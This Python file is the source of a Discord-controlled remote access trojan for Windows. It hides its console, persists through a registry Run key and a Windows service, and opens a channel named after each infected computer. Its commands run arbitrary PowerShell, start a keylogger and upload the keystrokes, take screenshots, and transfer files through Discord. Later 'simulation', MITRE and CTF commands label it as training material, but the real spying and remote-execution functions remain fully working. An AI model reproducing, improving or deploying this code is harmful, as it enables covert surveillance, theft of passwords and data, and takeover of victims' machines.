import discord
from discord.ext import commands, tasks
from discord import app_commands
import subprocess
import requests
from pynput.keyboard import Key, Listener
import threading
import os
from mss import mss
import tempfile
import asyncio
import psutil
import socket
import platform
from datetime import datetime
import sys
import time
import win32api
import win32con
import win32gui
import win32event
import win32service
import win32serviceutil
import servicemanager

TOKEN = "YOUR_TOKEN_HERE"
GUILD_ID = 12121212121212121212  # <-- your server ID

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True  # This is a privileged intent
intents.presences = True  # This is a privileged intent
intents.members = True  # This is a privileged intent

bot = commands.Bot(command_prefix='!', intents=intents)
bot_command_channel_id = None
last_attachment_url = None
key_log = []
stop_logger = threading.Event()

def hide_console():
    """Hide the console window."""
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

def set_registry_for_persistence():
    """Set registry to ensure the script runs on startup."""
    key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, win32con.KEY_ALL_ACCESS)
    win32api.RegSetValueEx(key, 'DiscordBotService', 0, win32con.REG_SZ, sys.executable)
    win32api.RegCloseKey(key)

class BotService(win32serviceutil.ServiceFramework):
    _svc_name_ = "DiscordBotService"
    _svc_display_name_ = "Discord Bot Service"
    _svc_description_ = "A service to run the Discord bot in the background."

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        socket.setdefaulttimeout(60)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, '')
        )
        self.main()

    def main(self):
        while True:
            rc = win32event.WaitForSingleObject(self.hWaitStop, 5000)
            if rc == win32event.WAIT_OBJECT_0:
                break
            try:
                bot.run(TOKEN)
            except Exception as e:
                print(f"Error running bot: {e}")
                time.sleep(5)

@bot.event
async def on_ready():
    await bot.tree.sync(guild=discord.Object(id=GUILD_ID))
    print(f'Logged in as {bot.user}!')

    guild = bot.get_guild(GUILD_ID)
    if guild:
        channel_name = f"{os.getenv('COMPUTERNAME', 'Unknown-PC')}"
        channel = await guild.create_text_channel(name=channel_name)
        global bot_command_channel_id
        bot_command_channel_id = channel.id
        print(f"Created and listening to new channel {channel_name} with ID {bot_command_channel_id}.")
        heartbeat.start()
    else:
        print("Guild not found. Ensure the GUILD_ID is correct.")

@bot.event
async def on_message(message):
    global last_attachment_url

    await bot.process_commands(message)

    if message.author == bot.user or not message.attachments:
        return

    if message.attachments:
        attachment = message.attachments[0]
        last_attachment_url = attachment.url
        await message.channel.send("New upload detected and URL saved.")

def on_press(key):
    try:
        if key.char:
            key_log.append(key.char)
    except AttributeError:
        if key == Key.space:
            key_log.append(' {space} ')
        elif key == Key.enter:
            key_log.append(' {enter} ')
        elif key == Key.backspace:
            key_log.append(' {backspace} ')
        else:
            key_log.append(f'<{key.name}>')

def on_release(key):
    if stop_logger.is_set():
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

@bot.tree.command(name="cmd", description="Execute a PowerShell command", guild=discord.Object(id=GUILD_ID))
async def execute_command(interaction: discord.Interaction, command: str):
    if interaction.channel_id != bot_command_channel_id:
        await interaction.response.send_message("This command cannot be processed in this channel.")
        return

    powershell_path = "powershell"
    result = subprocess.run([powershell_path, "-Command", command], capture_output=True, text=True, check=False)
    output = result.stdout if result.stdout else result.stderr

    if len(output) > 2000:
        with open('output.txt', 'w', encoding='utf-8') as file:
            file.write(output)
        await interaction.response.send_message("Output is too long, sending as a file:", file=discord.File('output.txt'))
        os.remove('output.txt')
    else:
        await interaction.response.send_message(f"```{output}```")

@bot.tree.command(name="url", description="Show the URL of the last uploaded file")
async def show_last_url(ctx):
    global last_attachment_url
    if last_attachment_url:
        await ctx.send(f"The last uploaded file URL is: {last_attachment_url}")
    else:
        await ctx.send("No file has been uploaded yet.")

@bot.tree.command(name="kstart", description="Start the keylogger", guild=discord.Object(id=GUILD_ID))
async def start_logging(interaction: discord.Interaction):
    global stop_logger, key_log
    stop_logger.clear()
    key_log = []
    threading.Thread(target=start_keylogger, daemon=True).start()
    await interaction.response.send_message("Keylogger has started.")

@bot.tree.command(name="kstop", description="Stop the keylogger and save the log", guild=discord.Object(id=GUILD_ID))
async def stop_logging(interaction: discord.Interaction):
    stop_logger.set()
    log_path = "logger.txt"
    with open(log_path, 'w') as file:
        file.write(''.join(key_log))
    await interaction.response.send_message("Keylogger has stopped.", file=discord.File(log_path))
    os.remove(log_path)

@bot.tree.command(name="ping", description="Check if the bot is up and measure latency", guild=discord.Object(id=GUILD_ID))
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    await interaction.response.send_message(f"Pong! {latency}ms")

@bot.tree.command(name="upload", description="Upload a file to the channel", guild=discord.Object(id=GUILD_ID))
async def upload_file(interaction: discord.Interaction, file_path: str):
    if interaction.channel_id != bot_command_channel_id:
        await interaction.response.send_message("This command cannot be processed in this channel.")
        return

    if not os.path.exists(file_path):
        await interaction.response.send_message("File does not exist.")
        return

    try:
        file = discord.File(file_path)
        await interaction.response.send_message("Uploading file...", file=file)
    except Exception as e:
        await interaction.response.send_message(f"Failed to upload file: {str(e)}")

@bot.tree.command(name="download", description="Download the last uploaded file to a specified path", guild=discord.Object(id=GUILD_ID))
async def download(interaction: discord.Interaction, file_path: str):
    global last_attachment_url
    if not last_attachment_url:
        await interaction.response.send_message("No file has been uploaded yet.")
        return

    try:
        response = requests.get(last_attachment_url)
        response.raise_for_status()

        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, 'wb') as f:
            f.write(response.content)
        await interaction.response.send_message(f"File has been downloaded and saved to {file_path}.")
    except requests.RequestException as e:
                await interaction.response.send_message(f"Failed to download file: {str(e)}")

@bot.tree.command(name="screenshot", description="Take a screenshot and upload it", guild=discord.Object(id=GUILD_ID))
async def screenshot(interaction: discord.Interaction):
    if interaction.channel_id != bot_command_channel_id:
        await interaction.response.send_message("This command cannot be processed in this channel.")
        return

    filename = screenshot_win()
    try:
        await interaction.response.send_message("Uploading screenshot...", file=discord.File(filename))
    finally:
        os.remove(filename)

def screenshot_win():
    with mss() as sct:
        screenshot_filename = os.path.join(tempfile.gettempdir(), "screenshot.png")
        sct.shot(output=screenshot_filename, mon=-1)
    return screenshot_filename

@bot.tree.command(name="kill", description="Stop the bot and delete its channel", guild=discord.Object(id=GUILD_ID))
async def kill_bot(interaction: discord.Interaction):
    if interaction.channel_id != bot_command_channel_id:
        await interaction.response.send_message("This command can only be processed in the bot's channel.")
        return

    try:
        channel = bot.get_channel(bot_command_channel_id)
        if channel:
            await channel.delete()
            print("Channel successfully deleted.")
        await interaction.response.send_message("Bot and channel are being terminated...")
    except Exception as e:
        await interaction.response.send_message(f"Failed to delete channel: {str(e)}")
        return

    await asyncio.sleep(1)
    await bot.close()
    print("Bot stopped.")

@tasks.loop(minutes=5)
async def heartbeat():
    channel = bot.get_channel(bot_command_channel_id)
    if channel:
        await channel.send(f"💓 Heartbeat: {bot.user} is online! Time: {discord.utils.utcnow().strftime('%m-%d-%Y %H:%M:%S UTC')}")

@heartbeat.before_loop
async def before_heartbeat():
    await bot.wait_until_ready()

# ---------------- BASIC ----------------

@bot.tree.command(name="latency_check", description="Check bot latency", guild=discord.Object(id=GUILD_ID))
async def latency_check(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    await interaction.response.send_message(f"🏓 Pong — {latency} ms")

# ---------------- WHOAMI (SAFE) ----------------

@bot.tree.command(name="whoami", description="Simulated host & user info", guild=discord.Object(id=GUILD_ID))
async def whoami(interaction: discord.Interaction):
    msg = (
        f"👤 User: `{interaction.user}`\n"
        f"🖥 OS (simulated): `{platform.system()}`\n"
        f"🐍 Python: `{platform.python_version()}`\n"
        f"⏱ Time: `{datetime.utcnow()} UTC`\n\n"
        "⚠️ Simulation mode — no real host data collected"
    )
    await interaction.response.send_message(msg)

# ---------------- CMD SIMULATION ----------------

@bot.tree.command(name="cmd_sim", description="Simulate command execution", guild=discord.Object(id=GUILD_ID))
@app_commands.describe(command="Command to simulate")
async def cmd_sim(interaction: discord.Interaction, command: str):
    fake_output = f"""
> {command}

[SIMULATION MODE]
Command parsed successfully.
No system command executed.

MITRE ATT&CK:
- T1059 (Command-Line Interface)
"""
    await interaction.response.send_message(f"```{fake_output}```")

# ---------------- ATTACK CHAIN ----------------

@bot.tree.command(name="attackchain", description="Red team attack lifecycle", guild=discord.Object(id=GUILD_ID))
async def attackchain(interaction: discord.Interaction):
    await interaction.response.send_message(
        "🔴 **Red Team Kill Chain**\n"
        "1️⃣ Reconnaissance\n"
        "2️⃣ Scanning & Enumeration\n"
        "3️⃣ Initial Access\n"
        "4️⃣ Privilege Escalation\n"
        "5️⃣ Lateral Movement\n"
        "6️⃣ Persistence\n"
        "7️⃣ Command & Control\n"
        "8️⃣ Exfiltration"
    )

# ---------------- MITRE ----------------

@bot.tree.command(name="mitre", description="MITRE ATT&CK reference")
@app_commands.describe(technique="Technique ID (e.g., T1059)")
async def mitre(interaction: discord.Interaction, technique: str):
    techniques = {
        "T1059": "Command-Line Interface",
        "T1071": "Application Layer Protocol",
        "T1056": "Input Capture",
        "T1105": "Ingress Tool Transfer"
    }

    desc = techniques.get(technique.upper(), "Technique not found")
    await interaction.response.send_message(
        f"🧠 **MITRE {technique.upper()}**\n{desc}\n\n"
        "Use for detection & defense planning"
    )

# ---------------- CTF ----------------

@bot.tree.command(name="ctfhelp", description="CTF checklist", guild=discord.Object(id=GUILD_ID))
async def ctfhelp(interaction: discord.Interaction):
    await interaction.response.send_message(
        "🏴 **CTF Checklist**\n"
        "✔ nmap scan\n"
        "✔ directory brute-force\n"
        "✔ version vulnerabilities\n"
        "✔ weak credentials\n"
        "✔ SUID binaries\n"
        "✔ cron jobs"
    )

if __name__ == '__main__':
    hide_console()
    set_registry_for_persistence()
    win32serviceutil.HandleCommandLine(BotService)
